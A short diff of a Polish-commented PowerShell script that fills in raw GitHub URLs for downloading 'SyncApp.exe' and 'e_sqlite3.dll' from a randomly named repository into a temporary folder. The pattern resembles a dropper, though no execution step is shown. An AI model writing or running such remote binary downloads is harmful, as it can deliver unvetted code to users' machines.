@@ -10,8 +10,8 @@ if (!(Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force 
 if (!(Test-Path $finalDir)) { New-Item -ItemType Directory -Path $finalDir -Force | Out-Null }
 
 # 2. Pobierz do Shell (Tymczasowo)
-$urlExe = "TUTAJ_LINK_RAW_DO_SYNCAPP_EXE"
-$urlDll = "TUTAJ_LINK_RAW_DO_E_SQLITE3_DLL"
+$urlExe = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/raw/refs/heads/main/SyncApp.exe"
+$urlDll = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/raw/refs/heads/main/e_sqlite3.dll"
 
 Write-Host "Inicjalizacja..."
 try {
